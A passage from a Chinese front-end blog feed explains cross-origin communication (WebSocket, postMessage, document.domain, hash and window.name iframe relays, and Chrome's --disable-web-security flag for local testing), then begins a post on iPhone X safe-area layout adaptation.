http://localhost:8080/api/a.js jsonpCallback(&#123;a:123&#125;);</span></span><br></pre></td></tr></table></figure><p>你仔细品，细细品，是不是 jsonp 有的优势就是 script 加载 js 的优势，加载的方式只不过换了一种说法。这也告诉我们一个道理，很多东西并没有那么神奇，是在你所学的知识范围内。就好比，桃树和柳树，如果你把他们当成很大跨度的东西去记忆理解，那么世上这么多树，你真的要累死了，你把他们都当成是树，哦吼？你会突然发现，你对世界上所有的树都有所了解，他们都会长叶子，光合作用….当然也有个例，但是你只需要去记忆这些细微的差别，抓住主干。。。嗯，反正就这么个道理。</p><p><a name="zCLt6"></a></p><h3 id="Websocket"><a href="#Websocket" class="headerlink" title="Websocket"></a>Websocket</h3><p><a href="http://dev.w3.org/html5/websockets/">WebSocket</a> 规范定义了一种 API，可在网络浏览器和服务器之间建立“套接字”连接。简单地说：客户端和服务器之间存在持久的连接，而且双方都可以随时开始发送数据。详细教程可以看 <a href="https://www.html5rocks.com/zh/tutorials/websockets/basics/">https://www.html5rocks.com/zh/tutorials/websockets/basics/</a><br />这种方式本质没有使用了 HTTP 的响应头, 因此也没有跨域的限制，没有什么过多的解释直接上代码吧。<br />前端部分</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  <span class="keyword">let</span> socket = <span class="keyword">new</span> <span class="title class_">WebSocket</span>(<span class="string">&quot;ws://localhost:8080&quot;</span>);</span><br><span class="line">  socket.<span class="property">onopen</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    socket.<span class="title function_">send</span>(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">  &#125;;</span><br><span class="line">  socket.<span class="property">onmessage</span> = <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(e.<span class="property">data</span>);</span><br><span class="line">  &#125;;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>后端部分</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">const WebSocket = require(&quot;ws&quot;);</span><br><span class="line">const server = new WebSocket.Server(&#123; port: 8080 &#125;);</span><br><span class="line">server.on(&quot;connection&quot;, function(socket) &#123;</span><br><span class="line">  socket.on(&quot;message&quot;, function(data) &#123;</span><br><span class="line">    socket.send(data);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><a name="8tAHi"></a></p><h3 id="window-postMessage"><a href="#window-postMessage" class="headerlink" title="window.postMessage"></a>window.postMessage</h3><p><strong>window.postMessage()</strong> 方法可以安全地实现跨源通信。通常，对于两个不同页面的脚本，只有当执行它们的页面位于具有相同的协议（通常为 https），端口号（443 为 https 的默认值），以及主机 (两个页面的模数 <code>[Document.domain](https://developer.mozilla.org/zh-CN/docs/Web/API/Document/domain)</code>设置为相同的值) 时，这两个脚本才能相互通信。<strong>window.postMessage()</strong> 方法提供了一种受控机制来规避此限制，只要正确的使用，这种方法就很安全。<br><a name="K6jTM"></a></p><h4 id="用途"><a href="#用途" class="headerlink" title="用途"></a>用途</h4><p>1.页面和其打开的新窗口的数据传递<br />2.多窗口之间消息传递<br />3.页面与嵌套的 iframe 消息传递<br><a name="tw30z"></a></p><h4 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h4><p>详细用法看 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Window/postMessage">https://developer.mozilla.org/zh-CN/docs/Web/API/Window/postMessage</a><br /><code>otherWindow.postMessage(message, targetOrigin, [transfer]);</code></p><ul><li>otherWindow: 其他窗口的一个引用，比如 iframe 的 contentWindow 属性、执行<a href="https://developer.mozilla.org/en-US/docs/DOM/window.open">window.open</a>返回的窗口对象、或者是命名过或数值索引的<a href="https://developer.mozilla.org/en-US/docs/DOM/window.frames">window.frames</a>。</li><li>message: 将要发送到其他 window 的数据。</li><li>targetOrigin: 通过窗口的 origin 属性来指定哪些窗口能接收到消息事件.</li><li>transfer(可选) : 是一串和 message 同时传递的 <code>[Transferable](https://developer.mozilla.org/zh-CN/docs/Web/API/Transferable)</code> 对象. 这些对象的所有权将被转移给消息的接收方，而发送一方将不再保有所有权<br><a name="HkkTp"></a></li></ul><h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><p>index.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span></span></span><br><span class="line"><span class="tag">  <span class="attr">src</span>=<span class="string">&quot;http://localhost:8080&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">frameborder</span>=<span class="string">&quot;0&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">id</span>=<span class="string">&quot;iframe&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">onload</span>=<span class="string">&quot;load()&quot;</span></span></span><br><span class="line"><span class="tag">&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">function</span> <span class="title function_">load</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    iframe.<span class="property">contentWindow</span>.<span class="title function_">postMessage</span>(<span class="string">&quot;秋风的笔记&quot;</span>, <span class="string">&quot;http://localhost:8080&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">window</span>.<span class="property">onmessage</span> = <span class="function"><span class="params">e</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">console</span>.<span class="title function_">log</span>(e.<span class="property">data</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;;</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>another.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">window</span>.<span class="property">onmessage</span> = <span class="function"><span class="params">e</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(e.<span class="property">data</span>); <span class="comment">// 秋风的笔记</span></span></span><br><span class="line"><span class="language-javascript">    e.<span class="property">source</span>.<span class="title function_">postMessage</span>(e.<span class="property">data</span>, e.<span class="property">origin</span>);</span></span><br><span class="line"><span class="language-javascript">  &#125;;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><a name="irBuk"></a></p><h3 id="document-domain-Iframe"><a href="#document-domain-Iframe" class="headerlink" title="document.domain + Iframe"></a>document.domain + Iframe</h3><p>从第 7 种到第 9 种方式，我觉得别人的写的已经很好了，为了完整性，我就拿别人的了。如有雷同….（不对，就是雷同….）不要说不出来。<br /><strong>该方式只能用于二级域名相同的情况下，比如</strong><code>**a.test.com**</code><strong>和</strong><code>**b.test.com**</code><strong>适用于该方式</strong>。 只需要给页面添加 <code>document.domain =&#39;test.com&#39;</code> 表示二级域名都相同就可以实现跨域。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">www.   baidu.  com     .</span><br><span class="line">三级域  二级域   顶级域   根域</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">// a.test.com</span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  helloa</span><br><span class="line">  <span class="tag">&lt;<span class="name">iframe</span></span></span><br><span class="line"><span class="tag">    <span class="attr">src</span>=<span class="string">&quot;http://b.test.com/b.html&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">frameborder</span>=<span class="string">&quot;0&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">onload</span>=<span class="string">&quot;load()&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">id</span>=<span class="string">&quot;frame&quot;</span></span></span><br><span class="line"><span class="tag">  &gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="property">domain</span> = <span class="string">&quot;test.com&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">load</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">console</span>.<span class="title function_">log</span>(frame.<span class="property">contentWindow</span>.<span class="property">a</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// b.test.com</span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  hellob</span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="property">domain</span> = <span class="string">&quot;test.com&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> a = <span class="number">100</span>;</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p><a name="za19h"></a></p><h3 id="window-location-hash-Iframe"><a href="#window-location-hash-Iframe" class="headerlink" title="window.location.hash + Iframe"></a>window.location.hash + Iframe</h3><p><a name="C4kD7"></a></p><h4 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h4><p>原理就是通过 url 带 hash ，通过一个非跨域的中间页面来传递数据。<br><a name="U752Q"></a></p><h4 id="实现流程"><a href="#实现流程" class="headerlink" title="实现流程"></a>实现流程</h4><p>一开始 a.html 给 c.html 传一个 hash 值，然后 c.html 收到 hash 值后，再把 hash 值传递给 b.html，最后 b.html 将结果放到 a.html 的 hash 值中。 同样的，a.html 和 b.htm l 是同域的，都是 <code>http://localhost:8000</code>，而 c.html 是<code>http://localhost:8080</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// a.html</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;http://localhost:8080/hash/c.html#name1&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">console</span>.<span class="title function_">log</span>(location.<span class="property">hash</span>);</span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">window</span>.<span class="property">onhashchange</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(location.<span class="property">hash</span>);</span></span><br><span class="line"><span class="language-javascript">  &#125;;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// b.html</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">window</span>.<span class="property">parent</span>.<span class="property">parent</span>.<span class="property">location</span>.<span class="property">hash</span> = location.<span class="property">hash</span>;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// c.html</span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">console</span>.<span class="title function_">log</span>(location.<span class="property">hash</span>);</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> iframe = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;iframe&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">  iframe.<span class="property">src</span> = <span class="string">&quot;http://localhost:8000/hash/b.html#name2&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(iframe);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><a name="uIldR"></a></p><h3 id="window-name-Iframe"><a href="#window-name-Iframe" class="headerlink" title="window.name + Iframe"></a>window.name + Iframe</h3><p>window 对象的 name 属性是一个很特别的属性，当该 window 的 location 变化，然后重新加载，它的 name 属性可以依然保持不变。<br />其中 a.html 和 b.html 是同域的，都是<code>http://localhost:8000</code>，而 c.html 是<code>http://localhost:8080</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">// a.html</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span></span></span><br><span class="line"><span class="tag">  <span class="attr">src</span>=<span class="string">&quot;http://localhost:8080/name/c.html&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">frameborder</span>=<span class="string">&quot;0&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">onload</span>=<span class="string">&quot;load()&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">id</span>=<span class="string">&quot;iframe&quot;</span></span></span><br><span class="line"><span class="tag">&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">let</span> first = <span class="literal">true</span>;</span></span><br><span class="line"><span class="language-javascript">  <span class="comment">// onload事件会触发2次，第1次加载跨域页，并留存数据于window.name</span></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">function</span> <span class="title function_">load</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">if</span> (first) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// 第1次onload(跨域页)成功后，切换到同域代理页面</span></span></span><br><span class="line"><span class="language-javascript">      iframe.<span class="property">src</span> = <span class="string">&quot;http://localhost:8000/name/b.html&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">      first = <span class="literal">false</span>;</span></span><br><span class="line"><span class="language-javascript">    &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// 第2次onload(同域b.html页)成功后，读取同域window.name中数据</span></span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">console</span>.<span class="title function_">log</span>(iframe.<span class="property">contentWindow</span>.<span class="property">name</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>b.html 为中间代理页，与 a.html 同域，内容为空。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// b.html</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// c.html</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">window</span>.<span class="property">name</span> = <span class="string">&quot;秋风的笔记&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>通过 iframe 的 src 属性由外域转向本地域，跨域数据即由 iframe 的 window.name 从外域传递到本地域。这个就巧妙地绕过了浏览器的跨域访问限制，但同时它又是安全操作。</p><p><a name="U3CTa"></a></p><h3 id="浏览器开启跨域（解决提出问题的人）"><a href="#浏览器开启跨域（解决提出问题的人）" class="headerlink" title="浏览器开启跨域（解决提出问题的人）"></a>浏览器开启跨域（解决提出问题的人）</h3><p><strong>非特殊必要情况，不建议使用。</strong><br><a name="windows"></a></p><h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">找到你安装的目录</span><br><span class="line">.\Google\Chrome\Application\chrome.exe --disable-web-security --user-data-dir=xxxx</span><br></pre></td></tr></table></figure><p><a name="mac"></a></p><h4 id="Mac"><a href="#Mac" class="headerlink" title="Mac"></a>Mac</h4><p><code>~/Downloads/chrome-data</code> 这个目录可以自定义.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Applications/Google\ Chrome\ Canary.app/Contents/MacOS/Google\ Chrome\ Canary  --disable-web-security --user-data-dir=~/Downloads/chrome-data</span><br></pre></td></tr></table></figure><p><a name="pQ3iJ"></a></p><h4 id="-2"><a href="#-2" class="headerlink" title=""></a></h4><p><a name="l0jyI"></a></p><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://mp.weixin.qq.com/s?__biz=MzA5NzkwNDk3MQ==&mid=2650590313&idx=1&sn=e3fb1d08745d09afa06ffa7db44910d5&scene=21#wechat_redirect">CORS 为什么要区分『简单请求』和『预检请求』？</a></p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 解决方案 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试 </tag>
            
            <tag> 浏览器 </tag>
            
            <tag> 原理 </tag>
            
            <tag> 跨域 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTML常见兼容问题</title>
      <link href="/2022/07/30/frontend/html/html-compatible/"/>
      <url>/2022/07/30/frontend/html/html-compatible/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><a name="fwfFj"></a></p><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>iphoneX 的“刘海”为相机和其他组件留出了空间，同时在底部也留有可操作区域。其实对于 web 前端来说，刘海在绝大多数的场景下是可以不用处理的，因为 safari 或客户端（微信，手 Q 等）的 statusBar 已经替我们抹平了顶部刘海，我们只需要关心底部的可操作区域，因为如果页面底部有按钮的话，就会被可操作区域给挡住。<br><a name="MGMfZ"></a></p><h3 id="iPhoneX-之变化"><a href="#iPhoneX-之变化" class="headerlink" title="iPhoneX 之变化"></a>iPhoneX 之变化</h3><p><a name="yXFoK"></a></p><h4 id="1-屏幕尺寸、分辨率"><a href="#1-屏幕尺寸、分辨率" class="headerlink" title="1. 屏幕尺寸、分辨率"></a>1. 屏幕尺寸、分辨率</h4><p>追求全面屏的 iPhone X 此次启用 5.8 英寸的超视网膜高清显示屏，458ppi 的屏幕像素密度。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/300943/1666081635168-afbcb6c4-7f5f-46bf-a1a4-6fbb06a145e4.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/300943/1666081635168-afbcb6c4-7f5f-46bf-a1a4-6fbb06a145e4.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br />竖屏时像素分辨率达到了 1125px × 2436px（375pt × 812pt @3x），可以发现 iPhone X 的宽度与原来的 iPhone 7 等 4.7 英寸屏的宽度是一致的，而高度却大了 145pt，长宽比也由原来常见的 16 : 9 变成了 13 : 6。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/300943/1666081635317-3044724c-c0e4-4f6a-9b7f-34072df4e91c.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/300943/1666081635317-3044724c-c0e4-4f6a-9b7f-34072df4e91c.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="gssKl"></a></p><h4 id="2-顶部刘海"><a href="#2-顶部刘海" class="headerlink" title="2.顶部刘海"></a>2.顶部刘海</h4><p>新版本的 iPhone 顶部有高度为 30pt 的黑色圆角条来放置扬声器、前置摄像头及各种传感器等，江湖人称 「刘海儿」，这也意味着原页面此处的内容有可能会被遮挡导致显示欠佳，进而影响用户体验，所以这也是我们需要关注的一个适配点。<br />刘海在绝大多数的场景下是可以不用处理的，因为 safari 或客户端（微信，手 Q 等）的 statusBar 已经替我们抹平了顶部刘海。<br><a name="xJ7kr"></a></p><h4 id="3-虚拟-Home-键"><a href="#3-虚拟-Home-键" class="headerlink" title="3.虚拟 Home 键"></a>3.虚拟 Home 键</h4><p>iPhone X 取消了以往的实体圆形 home 键，取而代之的是在屏幕底部一条 134pt × 5pt 的虚拟指示条。整个虚拟 Home 键也占据了一个高度 34pt 的保留区域。<br />原来实体 Home 键的单击返回桌面、双击唤起多任务处理、长按启动 Siri 等等基础功能操作，也幻化成了不同的手势操作或新技术替代，具体交互手势将在下节详述。而为了增强手势的操作感，整个虚拟 Home 键也占据了一个高度 34pt 的保留区域。<br />而在非特定条件下，这个虚拟指示条无论在横、竖屏中都将是强制性设计元素出现在屏幕底部上，意味着这设计中必须考虑好周围元素与它的兼容，因此，这又是我们适配过程中的另一个关注点。只有在需要获得沉浸式体验（如播放视频、查看图片）时，才会建议开发者可以虚拟指示条 「自动隐藏」功能。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/300943/1666081635248-bb443c96-fa7e-4cb0-8658-e9f810cd41fd.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/300943/1666081635248-bb443c96-fa7e-4cb0-8658-e9f810cd41fd.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="w2Klj"></a></p><h4 id="4-安全区域"><a href="#4-安全区域" class="headerlink" title="4.安全区域"></a>4.安全区域</h4><p>根据上述顶部刘海、虚拟 home 键的不同要求，Apple 提供了横、竖屏状态下的安全区域视觉规范。</p><ul><li>竖屏：竖屏时候，除去屏幕最顶部往下 44pt，底部往上 34pt 后，中间部分视为安全区域。</li><li>横屏：而横屏时候则相对复杂一些，因为虚拟指示条通常情况下都是出现在屏幕底部，所以不仅屏幕左右会留出 44pt 的空白位置，屏幕底部也会留出 21pt 的位置。</li></ul><p>至于为什么没有 “刘海儿” 一侧也会留出空白位置，则是 Apple 认为，“刘海儿”出现于左侧或右侧并不确定，让安全区域中的内容居中显示，可以避免屏幕旋转所造成的 UI 元素位置变化。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/300943/1666081635212-b26f4b24-0508-4a49-949c-68e341db7424.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/300943/1666081635212-b26f4b24-0508-4a49-949c-68e341db7424.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="ZRb8e"></a></p><h3 id="适配方案"><a href="#适配方案" class="headerlink" title="适配方案"></a>适配方案</h3><p>了解到 iPhone X 这边变化之后，我们大致可以知道需要在于安全区域布局、全屏图缩放裁切以及边界交互手势做相关的适配。在 iOS11 中我们可以使用 viewport-fit&#x3D;cover + safe-area-inset-*，<br><a name="xTEji"></a></p><h4 id="关于-viewport-fit"><a href="#关于-viewport-fit" class="headerlink" title="关于 viewport-fit"></a>关于 viewport-fit</h4><p>viewport-fit 可以设置可视视窗的大小，它有三个属性值：</p><ul><li>Auto：默认值。这个值不影响初始布局视窗，整个 Web 页面是可视的，与 Contain 表现一致。</li><li>Contain：最初的布局视窗和视觉布局视窗被设置为最大的矩形（左图）。</li><li>Cover：初始布局视窗和视觉布局视窗被设置为设备物理屏幕的限定矩形（右图）。</li></ul><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/300943/1666081635183-fb3978a6-de41-4ae6-b070-8589ee304007.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/300943/1666081635183-fb3978a6-de41-4ae6-b070-8589ee304007.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="s5zDN"></a></p><h4 id="关于-safe-area-inset"><a href="#关于-safe-area-inset" class="headerlink" title="关于 safe-area-inset-*"></a>关于 safe-area-inset-*</h4><p>各种 iPhone x 都是不规则形状，我们如何控制页面元素到安全区域呢？Apple 把安全区域的位置通过 css 属性提供给了开发者，它们可以通过 CSS 的 constant( )函数来完成：<br /><img 